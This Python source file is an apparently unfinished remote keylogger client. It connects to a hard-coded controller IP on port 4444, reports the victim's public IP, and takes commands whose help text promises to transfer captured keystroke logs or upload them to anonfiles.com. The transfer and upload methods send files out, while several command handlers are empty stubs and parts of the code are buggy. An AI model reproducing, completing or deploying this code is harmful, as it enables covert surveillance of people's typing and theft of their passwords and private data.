import socket
from anonfile import AnonFile

from src.functions.listener import *
from src.encryption.encode import *
import shutil
import requests
import os


class OnlineKeylogger:
    def __init__(self):
        self.port = 4444  # config["port"]
        self.ip = "192.168.1.8"  # config["ip"]
        self._DEFAULT_SIZE = 1024
        self._ENCODING_FORMAT = "UTF-8"
        self.client = socket.socket()

    def send(self, args, encode):
        return self.client.send(bytes(args).decode(encode))

    def recv(self, size, encode):
        if encode is not None:
            receive = self.client.recv(size).decode(encode)
        else:
            receive = self.client.recv(size)

        return receive

    def transfer(self, file):
        file_size = os.path.getsize(file)

        self.send(str(file_size), self._ENCODING_FORMAT)
        logs = open(file, "rb")
        file_bytes = logs.read(file_size)
        while True:
            if bytes:
                self.client.send(file_bytes)
                logs.close()
                break
            else:
                break

    def anonfile(self, file):
        anon = AnonFile()
        upload = anon.upload(file)
        return upload.url.geturl()

    def connectionHandle(self):
        try:
            print("Connecting to a server")
            self.client.connect((self.ip, self.port))

        except TimeoutError:
            return self.connectionHandle()

        target_ip = requests.get("https://checkip.amazonaws.com").text.strip()
        target_system = ""
        self.client.send(bytes(target_ip, self._ENCODING_FORMAT))
        self.client.send(bytes(target_system, self._ENCODING_FORMAT))

        while True:
            command = self.recv(self._DEFAULT_SIZE, self._ENCODING_FORMAT)
            if command == "help":
                command_list = """
                    ---------------------------------------------------------------------------------------------------------------------
                    Keylogger commands
                    ---------------------------------------------------------------------------------------------------------------------
                    
                    help                 displays this commands 
                    transfer             transfer the stored txt file with encrypted logs to your pc
                    upload file          upload encrypted logs to anonfiles.com and returns the link
                    realtime kl          starts logging all the keys
                    
                    ---------------------------------------------------------------------------------------------------------------------
                    exit                 closes connection between you and the target
        """
            elif command == "transfer":
                pass
            elif command == "upload file":
                pass
            elif command == "realtime keylogger":
                pass


if __name__ == "__main__":
    kl = OnlineKeylogger()
    threading.Thread(target=kl.connectionHandle()).start()